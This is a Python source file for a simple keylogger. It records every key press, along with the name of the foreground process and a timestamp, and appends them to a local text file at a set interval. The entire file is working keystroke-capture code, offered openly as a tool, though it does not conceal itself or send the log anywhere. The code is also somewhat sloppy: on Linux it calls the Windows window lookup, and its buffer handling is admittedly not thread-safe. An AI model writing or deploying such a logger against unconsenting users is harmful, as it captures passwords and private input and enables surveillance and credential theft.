import platform
import win32gui
import psutil
import win32process
import os
import threading
import time
import argparse
from datetime import datetime
from pynput import keyboard


class KeyLogger:
    def __init__(self, filename: str = "keylogging.txt", delay: int = 5):
        self.discovered_os = platform.system()
        self.start_dt = datetime.now()
        self.filename = filename
        self.delay = delay
        self.listener = None
        self.current_window = 'placeholder'
        self.primary_buffer = ''
        self.secondary_buffer = ''
        self.current_buffer = self.primary_buffer
        self.previous_buffer = None
        self.is_running = True
        self.update_text_thread = threading.Timer(self.delay, self.update_file_thread)
        self.update_text_thread.start()

    def on_press(self, key):
        if self.discovered_os == 'Linux':
            window_name = get_active_window_name('Windows')
            self.append_to_buffer(window_name, key)
        elif self.discovered_os == 'Windows':
            window_name = get_active_window_name('Windows')
            self.append_to_buffer(window_name, key)

        if key == keyboard.Key.f1:
            self.stop_listening()

    def append_to_buffer(self, window_name, key):
        # print(self.current_window)
        if self.current_window not in window_name:
            self.current_window = window_name
            print(self.current_window + ' ' + window_name + '')
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            self.current_buffer += '\n'
            self.current_buffer += window_name + ' ' + current_time
            self.current_buffer += '\n'
            self.current_buffer += str(key)
        else:
            self.current_buffer += str(key)

    def start_listening(self):
        self.listener = keyboard.Listener(
            on_press=self.on_press
        )
        self.listener.start()

    def stop_listening(self):
        self.is_running = False
        self.listener.stop()
        self.write_to_file()

    def update_file_thread(self):
        self.write_to_file()
        while self.is_running:
            time.sleep(self.delay)
            self.write_to_file()

    def write_to_file(self):
        # Currently not thread safe
        self.previous_buffer = self.current_buffer
        self.switch_buffers()
        # Ensure that the file exists before we append information (If not create it).
        if not os.path.isfile(self.filename):
            file = open(self.filename, 'w')
        with open(self.filename, "a") as text_file:
            text_file.write(self.previous_buffer)
        # print(self.previous_buffer)
        # Clear the buffer for future input
        self.previous_buffer = ''

    def switch_buffers(self):
        if self.current_buffer == self.primary_buffer:
            self.current_buffer = self.secondary_buffer
        else:
            self.current_buffer = self.primary_buffer


def get_active_window_name(operating_system):
    if operating_system == 'Linux':
        # Todo - discover how to capture focussed window on Linux
        return ''
    elif operating_system == 'Windows':
        window = win32gui
        window.GetWindowText(window.GetForegroundWindow())
        pid = win32process.GetWindowThreadProcessId(window.GetForegroundWindow())
        return psutil.Process(pid[-1]).name()


def terminal_parser():
    parser = argparse.ArgumentParser(
        usage="%(prog)s [OPTIONS]",
        description="Very simple keylogger which records key presses and the window they occurred from to a file."
    )
    parser.add_argument(
        "-v", "--version", action="version",
        version=f"{parser.prog} version 1.0.0"
    )
    parser.add_argument(
        "-f", "--filename", type=str, default="keylogging.txt",
        help="Set where you wish the keylogger to save the data it receives."
    )
    parser.add_argument(
        "-d", "--delay", type=int, default=5,
        help="Set how often you wish the keylogger to write to the file in seconds."
    )

    return parser


def main():
    parser = terminal_parser()
    args = parser.parse_args()
    key_logger = KeyLogger(args.filename, args.delay)
    key_logger.start_listening()
    while key_logger.is_running:
        time.sleep(1)


if __name__ == "__main__":
    main()
